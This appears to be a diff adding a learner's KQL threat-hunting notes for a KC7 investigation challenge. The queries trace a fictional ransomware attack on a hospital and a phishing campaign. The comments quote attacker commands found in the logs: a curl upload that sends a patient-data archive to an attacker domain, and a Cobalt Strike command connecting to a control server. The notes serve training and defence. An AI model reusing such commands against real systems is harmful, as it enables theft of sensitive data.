@@ -1,0 +1,114 @@
+// the Challenge: https://kc7cyber.com/challenges/195
+
+// Ransomware Group: Lock Byte
+// Gave the Hospital 72 Hours to pay up
+// We spend your money so you don't have to
+
+FileCreationEvents
+| where filename endswith ".encrypted"
+| count
+// 6,420 file encrypted
+
+// Finding Distinct number of host names encrypted
+FileCreationEvents
+| where filename endswith ".encrypted"
+| distinct hostname
+| count
+// 321
+
+FileCreationEvents
+| where filename == "We_Have_Your_Data_Pay_Up.txt"
+// 97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018
+// C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt
+// AMFB-MACHINE
+
+FileCreationEvents
+| where filename == "We_Have_Your_Data_Pay_Up.txt"
+| count
+
+Employees
+| where hostname == "AMFB-MACHINE"
+// Anthony Davis - machine owner
+
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-06-17) ..  datetime(2024-06-18)) and process_commandline has ".exe"
+// lockbyte_ransomer.exe
+// spread_ransomware.exe
+// cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_3.zip https://secure-health-access.com/upload/patient_data_3.zip
+// Tool: patient_data_exporter.exe
+// \\jojos-hospital-server\important_data\patient_records ; \\jojos-hospital-server\important_data\archive\patient-records ; \\jojos-hospital-server\important_data\old-patient-data
+
+OutboundNetworkEvents
+| where url has "patient_data_exporter.exe"
+// secure-health-access.com
+// Downloded: 2024-06-17T14:22:29Z
+
+PassiveDns
+| where domain == "secure-health-access.com"
+// 203.0.113.1
+// 203.0.113.2
+
+PassiveDns
+| where ip in ("203.0.113.1", "203.0.113.2")
+// emr-help.net
+
+InboundNetworkEvents
+| where src_ip  in ("203.0.113.1", "203.0.113.2")
+| where url has "bypass"
+
+InboundNetworkEvents
+| where src_ip  in ("203.0.113.1", "203.0.113.2")
+| where url has "patient"
+
+AuthenticationEvents
+| where src_ip  in ("203.0.113.1", "203.0.113.2")
+// Midnight 2024-05-20T00:00:00Z
+// 203.0.113.1
+// andavis
+
+
+// Section 2
+// raisinkanes.com
+
+OutboundNetworkEvents
+| where url has "totally"
+// https://nothing-to-see-here.net/images/public/Raisin_Kane_Promo_Offer.docx
+// https://totally-legit-domain.com/online/files/Raisin_Kane_Free_Meal_Voucher.pdf
+
+FileCreationEvents
+| where filename == "Raisin_Kane_Promo_Offer.docx"
+// First victim hostname RQJQ-MACHINE
+// 2024-05-01T09:56:50Z
+// sha - bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712
+// chrome
+
+FileCreationEvents
+| where hostname == "RQJQ-MACHINE"
+// cobaltstrike.exe
+
+ProcessEvents
+| where hostname == "RQJQ-MACHINE"
+| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02)) and process_commandline has "Raisin_Kane"
+// "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\evbrowne\Downloads\Raisin_Kane_Promo_Offer.docx"
+// 2024-05-01T09:57:16Z
+// C:\ProgramData\cobaltstrike.exe --connect 93.238.22.122:50050
+
+ProcessEvents
+| where hostname == "RQJQ-MACHINE"
+| where timestamp between (datetime(2024-05-02) .. datetime(2024-05-04))
+
+Employees
+| where name == "Anthony Davis"
+// hostname AMFB-MACHINE 10.10.0.1
+
+ProcessEvents
+| where hostname == "AMFB-MACHINE" and process_commandline has "cobaltstrike.exe"
+//2024-05-14T12:24:45Z
+
+ProcessEvents
+| where hostname == "AMFB-MACHINE"
+| where timestamp between (datetime(2024-05-13) .. datetime(2024-05-17))
+
+
+
